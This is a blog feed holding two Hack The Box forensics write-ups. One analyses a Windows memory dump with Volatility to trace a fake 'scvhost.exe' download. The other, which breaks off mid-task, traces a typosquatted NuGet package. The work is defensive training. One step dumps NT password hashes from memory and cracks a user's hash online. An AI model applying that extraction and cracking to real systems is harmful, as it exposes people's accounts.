<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://its-radio.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://its-radio.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2025-02-25T00:51:27+00:00</updated><id>https://its-radio.github.io/feed.xml</id><title type="html">Edmund’s Infosec Blog</title><subtitle>A blog about threat detection &amp; intelligence, CTFs &amp; education, and other information security topics </subtitle><entry><title type="html">HTB Write-Up | Medium Sherlock | Mellitus</title><link href="https://its-radio.github.io/blog/2025/Mellitus-Write-Up/" rel="alternate" type="text/html" title="HTB Write-Up | Medium Sherlock | Mellitus"/><published>2025-02-22T00:00:00+00:00</published><updated>2025-02-22T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2025/Mellitus-Write-Up</id><content type="html" xml:base="https://its-radio.github.io/blog/2025/Mellitus-Write-Up/"><![CDATA[<style>.small-margin>*{margin-bottom:.1rem}</style> <h2 id="introduction">Introduction</h2> <p>This is a write-up for Hack The Box’s Sherlock challenge, <strong>Mellitus</strong>. This Sherlock is rated as <strong>Medium</strong>, but I’ll try to keep the write-up beginner friendly and approachable. I’ll cover most methods thoroughly and explain the reasoning for decisions that I make. If there is anything you don’t understand or if you have any specific questions, please feel free to reach out to me on X. Seriously! I’ll actually try to help you out.</p> <h1 id="tools--setup">Tools &amp; Setup</h1> <p>For this investigation, I exclusively used a machine running Fedora 40, meaning that I had access to all the standard linux tools like <code class="language-plaintext highlighter-rouge">grep</code>, <code class="language-plaintext highlighter-rouge">strings</code>, etc. Of course, there are Windows eqivalents for most of these tools, and it is possible to repeat any of these steps on Windows.</p> <p>The primary forensics tools I relied on for this challenge was the <a href="https://volatilityfoundation.org/">Volatility Framework</a>–an invaluable, open-source memory forensics tool. I mainly used <a href="https://github.com/volatilityfoundation/volatility3">Volatility 3</a> but it may also be useful to have <a href="https://github.com/volatilityfoundation/volatility">Volatility 2</a> on hand in some cases.</p> <p>I am working on my own Volatility cheatsheet which I may post later, but for now let me point you to this execellent <a href="https://blog.onfvp.com/post/volatility-cheatsheet/">cheatsheet by Ashley Peterson</a>. It shows how to use a bunch of the most useful Volatility plugins in both Volatility 2 and Volatility 3.</p> <h2 id="starting-out">Starting Out</h2> <p>I always start by thoroughly reading the description. It reads:</p> <p><em>You’ve been a SOC analyst for the last 4 years but you’ve been honing your incident response skills! It’s about time you bite the bullet and go for your dream job as an Incident Responder as that’s the path you’d like your career to follow. Currently you are going through the interview process for a medium size incident response internal team and the cocky interviewing responder has given you a tough technical challenge to test your memory forensics aptitude. Can you get all the questions right and secure the job?</em></p> <p>Okay, not much in there except that we are looking at memory forensics and it’s likely that the evidence is going to be similar to something a responder might encounter in an incident response.</p> <h2 id="downloading-mellituszip-and-decompressing-it">Downloading mellitus.zip and decompressing it</h2> <p>For whatever reason I’ve had trouble with the <code class="language-plaintext highlighter-rouge">unzip</code> command handling the evidence archives from HTB, so I always use <code class="language-plaintext highlighter-rouge">7z</code> to decompress them. Other compression tools probably work, but <code class="language-plaintext highlighter-rouge">7z</code> is a popular and easy choice. Keep in mind that you’ll need to enter a password in order to decompress the archive. You can get the password on HTB as shown in the image below.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/1.png" sizes="95vw"/> <img src="/assets/img/mellitus/1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 1 </div> <p>Decompress the archive as shown and take a look at what’s inside. You can use (also shown in Fig. 2):</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7z x mellitus.zip
</code></pre></div></div> <p>The evidence contsists of 2 files (Fig. 2):</p> <ol> <li>memory_dump.vmem This is a memory image created by VMWare virutalization software. That is, it’s one to one copy of the RAM on on a VMWware virtual machine at the time the image was taken. It should contain the bulk of the important information.</li> <li>memory_dump.vmsn This is a file that contains snapshot information about the VM. I am not too familiar with analyzing these forensically, but VM snapshots contain information about the current state of the machine, configuration information, etc. It could prove useful.</li> </ol> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/2.png" sizes="95vw"/> <img src="/assets/img/mellitus/2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 2 </div> <p><strong>Note:</strong> <em>I like to save my volatility output so that I can easily grep through it later, but I don’t want to grep the entire image each time. to facilitate this, I’ve organized my challenge directory like this:</em></p> <pre><code class="language-plain">mellitus
    output
        &lt;My outputs go here&gt;
        &lt;I'm mostly working from this dir&gt;
    vmems
        memory_dump.vmem
        memory_dump.vmsn
</code></pre> <p><em>It will make sense as we work through the problems.</em></p> <p>Now that we have seen the evidence, let’s’ jump into Task 1.</p> <h2 id="task-1-what-was-the-time-on-the-system-when-the-memory-was-captured">Task 1: What was the time on the system when the memory was captured?</h2> <p>Use the <code class="language-plaintext highlighter-rouge">windows.info</code> plugin to view the image’s metadata.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem windows.info | <span class="nb">tee </span>info.vol
</code></pre></div></div> <p>The use of <code class="language-plaintext highlighter-rouge">tee</code> allows me to view the output in real time and and write it to a file at the same time. The system time at the time of capture is shown in the output of the <code class="language-plaintext highlighter-rouge">windows.info</code> plugin (Fig. 3).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/3.png" sizes="95vw"/> <img src="/assets/img/mellitus/3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 3 </div> <h2 id="task-2-what-is-the-ip-address-of-the-attacker">Task 2: What is the IP address of the attacker?</h2> <p>There are two command and useful network-related plugins for volatility: <code class="language-plaintext highlighter-rouge">windows.netscan</code> and <code class="language-plaintext highlighter-rouge">windows.netstat</code>. Netscan returns information about both active and closed connections, while netstat is generally less comprehensive. They are both useful, but I went with netscan first.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem windows.netscan | <span class="nb">tee </span>netscan.vol
</code></pre></div></div> <p>If you aren’t used to looking at these, the output can look a bit daunting, but it really isn’t that bad. Right now, all we’re looking for is something out of the ordinary. One relavent aspect of a connection is the port used on each machine. In this case, one of the connections to a remote machine is targetting port 4545 (Fig. 4), which is not typically associated with any common service. This alone doesn’t confirm malicious behavior, but it sticks out.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/4.png" sizes="95vw"/> <img src="/assets/img/mellitus/4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 4 </div> <p>Trying out the IP as the answer confirms that it is, in fact, the answer.</p> <h3 id="task2a">Confirming the IP is malicious</h3> <p>In real life we’d need to confirm this IP address another way, so let’s take a minute and do that before moving on. One easy thing to do when you have a suspected malicious IP is just extract the strings from the memory dump and grep for the IP. This casts a fairly wide net and is definitely worth doing.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings ../vmems/memory_dump.vmem | <span class="nb">grep </span>192.168.157.151
</code></pre></div></div> <p>There is… a lot of malicous stuff going on in the output. I’m not even going to include the entire thing, but just in Figure 5, there are several signs of malicous activity. It’s all suspicious, but downloading “scvhost.exe”, a close mispelling of the native Windows executable “svchost.exe” is egregiously malicious. It may as well be screaming that it’s malicious.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/5.png" sizes="95vw"/> <img src="/assets/img/mellitus/5.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 5 </div> <h2 id="task3">Task 3: What is the name of the strange process?</h2> <p>based on the download in Figure 5, I’d like to place a bet that it’ll be “<code class="language-plaintext highlighter-rouge">scvhost.exe</code>”, but let’s take a look at the processes to find out. Here we can use one of a few plugins. Really you can choose from w<code class="language-plaintext highlighter-rouge">indows.pslist</code>, <code class="language-plaintext highlighter-rouge">windows.psscan</code>, and <code class="language-plaintext highlighter-rouge">windows.pstree</code>. These are each slightly different, but I tend to like the output from <code class="language-plaintext highlighter-rouge">pstree</code> because it includes the full file path of the running executables. The output can be hard to parse in a terminal though due to the length of the lines, so I’ll just <code class="language-plaintext highlighter-rouge">tee</code> it to a file like usual, open it in a text editor and zoom out a bit (Fig. 6).</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem windows.pstree | <span class="nb">tee </span>pstree.vol
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/6.png" sizes="95vw"/> <img src="/assets/img/mellitus/6.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 6 </div> <p>In Figure 6, we can see that <code class="language-plaintext highlighter-rouge">scvhost.exe</code> did indeed run on the machine as PID 11156. Not only is it mispelled, but its running out of user BantingFG’s Downloads folder. Even if it were named correctly, <code class="language-plaintext highlighter-rouge">svchost.exe</code> running from a downloads folder is highly suspect. It should only ever run from its designated locations like <code class="language-plaintext highlighter-rouge">System32</code>, <code class="language-plaintext highlighter-rouge">SysWOW64</code>, etc.</p> <p>It’s also interesting to note that it is running as a child of Powershell PID 6772. Moving back another layer, we can see that powershell PID 6772 and some other prcesses are a child of PID 1424. I ran the <code class="language-plaintext highlighter-rouge">pslist</code> plugin for easier visual parsing in the terminal, then grepped for “1424”. PID 1424 turns out to be explorer.exe and it has some other interesting children (Fig. 7).</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem windows.pslist | <span class="nb">tee </span>pslist.vol
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep </span>1424 pslist.vol
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/7.png" sizes="95vw"/> <img src="/assets/img/mellitus/7.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 7 </div> <p>Pretty much all of these processes (Fig. 7) warrant further invesetigation, but at first glance I’m especially curious about the <code class="language-plaintext highlighter-rouge">cmd.exe</code>, <code class="language-plaintext highlighter-rouge">FTK Imager.exe</code>, <code class="language-plaintext highlighter-rouge">python.exe</code>, <code class="language-plaintext highlighter-rouge">powershell.exe</code>, and <code class="language-plaintext highlighter-rouge">chrome.exe</code>.</p> <p>But I degress. The answer to task 3 is <code class="language-plaintext highlighter-rouge">scvhost.exe</code>. We’ll come back to these, but for now let’s move on to Task 4.</p> <h2 id="task-4-what-is-the-pid-of-the-process-that-launched-the-malicious-binary">Task 4: What is the PID of the process that launched the malicious binary?</h2> <p>I already found this in the previous task. It was launched by <code class="language-plaintext highlighter-rouge">powershell.exe</code> PID 6772.</p> <h2 id="task-5-what-was-the-command-that-got-the-malicious-binary-onto-the-machine">Task 5: What was the command that got the malicious binary onto the machine?</h2> <p>I also already found this. It’s the <code class="language-plaintext highlighter-rouge">curl</code> command from <a href="#task2a">Task 2</a>. In Task 2, I found it by dumping the strings from the image and grepping for the malicous IP, but there are other ways to find this command too. For example:</p> <p>Use the memmap plugin to dump the memory related to powershell PID 6772. It will create a file called <code class="language-plaintext highlighter-rouge">pid.6772.dmp</code></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem windows.memmap <span class="nt">--dump</span> <span class="nt">--pid</span> 6772
</code></pre></div></div> <p>Dump the strings from the <code class="language-plaintext highlighter-rouge">pid.6772.dmp</code> into a new file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings pid.6772.dmp <span class="o">&gt;&gt;</span> 6772.strings
</code></pre></div></div> <p>Then open 6772.strings in a text editor and search for words related to that the mispelled malicous file <code class="language-plaintext highlighter-rouge">scvhost.exe</code>. There are hundreds of results, but in truth, it doesn’t take that long to quickly glance through 250+ matches. Or if you chose to search for ‘downloads’ (since it’s running from the Downloads folder), you’ll hit a great result after only 11 matches (Fig. 8)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/8.png" sizes="95vw"/> <img src="/assets/img/mellitus/8.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 8 </div> <p>In Figure 8, we can observe the attacker repeatedly trying and failing to download their payload before eventually suceeding and running it.</p> <h2 id="task-6-the-attacker-attempted-to-gain-entry-to-our-host-via-ftp-how-many-users-did-they-attempt">Task 6: The attacker attempted to gain entry to our host via FTP. How many users did they attempt?</h2> <p>Again, I already caught some of this back in <a href="#task2a">Task 2</a>, but we need to revisit it to count usernames. From the output I looked at in Task 2, it looks like there are 3 unique usernames (Fig. 9).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/9.png" sizes="95vw"/> <img src="/assets/img/mellitus/9.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 9 </div> <p>Since there is a lot of output, I added one more grep to narrow it down. This takes the output from Task 2 and then greps for it for lines containing either ‘password’ or ‘user’ since both types of lines can contain usernames in this context.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings ../vmems/memory_dump.vmem | <span class="nb">grep </span>192.168.157.151 | <span class="nb">grep</span> <span class="nt">-iE</span> <span class="s2">"password|user"</span>
</code></pre></div></div> <p>This narrowed the output to less than one page (Fig. 10) and I still didn’t see other usernames, so the answer should be 3.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/10.png" sizes="95vw"/> <img src="/assets/img/mellitus/10.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 10 </div> <h2 id="task-7-what-is-the-full-url-of-the-last-website-the-attacker-visited">Task 7: What is the full URL of the last website the attacker visited?</h2> <p>Back to the <code class="language-plaintext highlighter-rouge">chrome.exe</code> PID 8048 spawned from the malicious <code class="language-plaintext highlighter-rouge">explorer.exe</code> PID 1424 (see the end of <a href="#task3">Task 3</a>). I’m targetting its history database, which will be a file that it should have loaded into memory. To dump the files related to its PID, first I’ll make a directory for them to go in:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>chrome8048
</code></pre></div></div> <p>Then use the <code class="language-plaintext highlighter-rouge">windows.dumpfile</code> plugin to dump the related files:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem <span class="nt">-o</span> chrome8048 windows.dumpfile <span class="nt">--pid</span> 8048
</code></pre></div></div> <p>Identify the history database. This command also just checks their file types after finding them. It is a SQLite database as shown in Figure 11:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find chrome8048 <span class="nt">-iname</span> <span class="s2">"*hist*"</span> <span class="nt">-exec</span> file <span class="o">{}</span> <span class="se">\;</span>
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/11.png" sizes="95vw"/> <img src="/assets/img/mellitus/11.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 11 </div> <p>I’m using <a href="https://sqlitebrowser.org/">sqlitebrowser</a> to open and browse through the history DB (Fig. 12). The correct file to use is <code class="language-plaintext highlighter-rouge">file.0xc40aa9259df0.0xc40aa4ec6be0.SharedCacheMap.History.vacb</code>. Open it, go to the section indicated in Figure 12 and look for URLs the attacker might have visited. They were having trouble downloading their file, so the searches and sites towards the bottom look likely. One turns out to be correct.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/12.png" sizes="95vw"/> <img src="/assets/img/mellitus/12.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 12 </div> <h2 id="task-8-what-is-the-affected-users-password">Task 8: What is the affected users password?</h2> <p>For this one, I used the <code class="language-plaintext highlighter-rouge">windows.hashdump</code> plugin to extract any user hashes that existed in the memory image (Fig. 13).</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem windows.hashdump
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/13.png" sizes="95vw"/> <img src="/assets/img/mellitus/13.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 13 </div> <p>The user who seems most affected by all of this seems to be BantingFG, since the malicious file is in his downloads folder, etc. I threw his NT Hash into <a href="https://crackstation.net/">CrackStation</a> and it immediately returned a result (Fig. 14)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/14.png" sizes="95vw"/> <img src="/assets/img/mellitus/14.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 14 </div> <h2 id="task-9-there-is-a-flag-hidden-related-to-pid-5116-can-you-confirm-what-it-is">Task 9: There is a flag hidden related to PID 5116. Can you confirm what it is?</h2> <p>Coming soon… Seriously, I’ll add Task 9 tomorrow.</p> <p>Thanks for reading! If you have any questions or comments, feel free to reach out or follow <a href="https://x.com/its_rad_io">me on X</a></p>]]></content><author><name></name></author><category term="Write-Ups"/><category term="forensics"/><category term="medium"/><category term="sherlock"/><category term="HackTheBox"/><category term="memory"/><category term="volatility"/><summary type="html"><![CDATA[A write-up for Hack The Box's forensics challenge 'Mellitus'. This challenge focuses primarily on memory forensics, with the evidence consisting solely of a forensic memory dump from a targetted machine.]]></summary></entry><entry><title type="html">HTB Write-Up | Medium Sherlock | Nuts</title><link href="https://its-radio.github.io/blog/2025/Nuts-Write-Up/" rel="alternate" type="text/html" title="HTB Write-Up | Medium Sherlock | Nuts"/><published>2025-02-20T00:00:00+00:00</published><updated>2025-02-20T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2025/Nuts-Write-Up</id><content type="html" xml:base="https://its-radio.github.io/blog/2025/Nuts-Write-Up/"><![CDATA[<style>.small-margin>*{margin-bottom:.1rem}</style> <h2 id="introduction">Introduction</h2> <p>This is a write-up for Hack The Box’s Sherlock challenge, <strong>Nuts</strong>. This Sherlock is rated as <strong>Medium</strong>, but I’ll try to keep the write-up beginner friendly and approachable. I’ll cover most methods thoroughly and explain the reasoning for decisions that I make. If there is anything you don’t understand or if you have any specific questions, please feel free to reach out to me on X. Seriously! I’ll actually try to help you out.</p> <p>For this demo I’m primarily using Fedora 40 as my OS, but I may end up on Windows to make it easier to use certain tools.</p> <h2 id="starting-out">Starting Out</h2> <p>I usually start out CTFs by reading the description thoroughly, but there is no description for this challenge, so lets get straight into the evidence.</p> <h2 id="downloading-nutszip-and-decompressing-it">Downloading Nuts.zip and decompressing it</h2> <p>For whatever reason the <code class="language-plaintext highlighter-rouge">unzip</code> command has a hard time handling the evidence archives from HTB, so I always advise <code class="language-plaintext highlighter-rouge">7z</code> to decompress them. Other compression tools probably work, but <code class="language-plaintext highlighter-rouge">7z</code> is a popular and easy choice. Keep in mind that you’ll need to enter a password in order to decompress the archive. You can get the password on HTB as shown in the image below.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/1.png" sizes="95vw"/> <img src="/assets/img/nuts/1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 1 </div> <p>Decompress the archive as shown and take a look at what’s inside. You can use:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7z x Nuts.zip
</code></pre></div></div> <p>It looks like this is the root of a Windows file system.</p> <div class="row mt-3"> <div class="col-sm-5 mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/2.png" sizes="95vw"/> <img src="/assets/img/nuts/2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 2 </div> <p>Running <code class="language-plaintext highlighter-rouge">tree</code> on it shows thousands of files and dirs, confirming that this is most likely a some kind of forensic image of a Windows file system.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/3.png" sizes="95vw"/> <img src="/assets/img/nuts/3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 3 </div> <p>Okay, let’s hop into Task 1.</p> <h2 id="task1">Task 1: What action did Alex take to integrate the purported time-saving package into the deployment process? (provide the full command)</h2> <p>Just looking through the Administrator home folder, I noticed this directory standing out.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/4.png" sizes="95vw"/> <img src="/assets/img/nuts/4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 4 </div> <p>Notice the misspelling of “Ignore” as “Ignor”. This could be a typosquatted package–a technique in which hackers build a malicious version of a popular package and name it something very similar to the original in a way that would be very easy to accidentally mistype. They are maliciously hoping that people will make a typo and inadvertently install the malware-laden package.</p> <p>This <code class="language-plaintext highlighter-rouge">PublishIgnor 1.0.11-beta</code> is most likely the package referenced in the task, but what action was taken to integrate it? The usual method would be to install it via commandline. Given that a log of a command to install a package would necessarily include its name, I grepped for the package name and found a result in ConsoleHost_history.txt:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/5.png" sizes="95vw"/> <img src="/assets/img/nuts/5.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 5 </div> <p>While I was at it, I checked the contents of Administrator’s ConsoleHost_history.txt as well as checking if other users had a similar log with this command:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">.</span> <span class="nt">-iname</span> <span class="s2">"*consolehost*"</span> <span class="nt">-exec</span> <span class="nb">echo</span> <span class="o">{}</span> <span class="se">\;</span> <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/6.png" sizes="95vw"/> <img src="/assets/img/nuts/6.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 6 </div> <h2 id="task-2-identify-the-url-from-which-the-package-was-downloaded">Task 2: Identify the URL from which the package was downloaded.</h2> <p>In the same grep output from the last task, I noticed a bunch of binary matches for files related to Google Chrome, including its history database.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/7.png" sizes="95vw"/> <img src="/assets/img/nuts/7.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 7 </div> <p>I used this command to view the related parts of the history:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings <span class="s2">"C/Users/Administrator/AppData/Local/Google/Chrome/User Data/Default/History"</span> | <span class="nb">grep</span> <span class="nt">-iC</span> 5 <span class="s2">"PublishIgnor.1.0.11-beta"</span> 
</code></pre></div></div> <p>Which resulted in the following output:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/8.png" sizes="95vw"/> <img src="/assets/img/nuts/8.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 8 </div> <p>Two elements in the history pop out as especially interesting. For this task, of course one of the URLs looks interesting. Visiting it reveals that the page is unavailable, but one directory back at <code class="language-plaintext highlighter-rouge">https://www.nuget.org/packages/PublishIgnor</code> shows that the package has been deleted. The page also includes the second interesting element from the chrome history: The username <strong>a1l4m</strong> (keep this in mind for task 3). For now, we can confirm that this was a typosquatted package, as visiting <code class="language-plaintext highlighter-rouge">https://www.nuget.org/packages/PublishIgnore</code> shows a legitimate package. Enter the typosquatted URL as the correct answer.</p> <h2 id="task-3-who-is-the-threat-actor-responsible-for-publishing-the-malicious-package-the-name-of-the-package-publisher">Task 3: Who is the threat actor responsible for publishing the malicious package? (the name of the package publisher)</h2> <p>Again, the typosquatted page shows the same username we observed in the chrome history.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/9.png" sizes="95vw"/> <img src="/assets/img/nuts/9.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 9 </div> <p>In the history we saw “who is this guy named a1l4m?” and now we confirm that he was the publisher of the package.</p> <h2 id="task-4-when-did-the-attacker-initiate-the-download-of-the-package-provide-the-timestamp-in-utc-format-yyyy-mm-dd-hhmm">Task 4: When did the attacker initiate the download of the package? Provide the timestamp in UTC format (YYYY-MM-DD HH:MM).</h2> <p>Read that time format twice! YYYY-MM-DD HH:MM, no SS.</p> <p>Searching for any related files lead me to discover another instance of the package.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">.</span> <span class="nt">-iname</span> <span class="s2">"*publishignor*"</span>
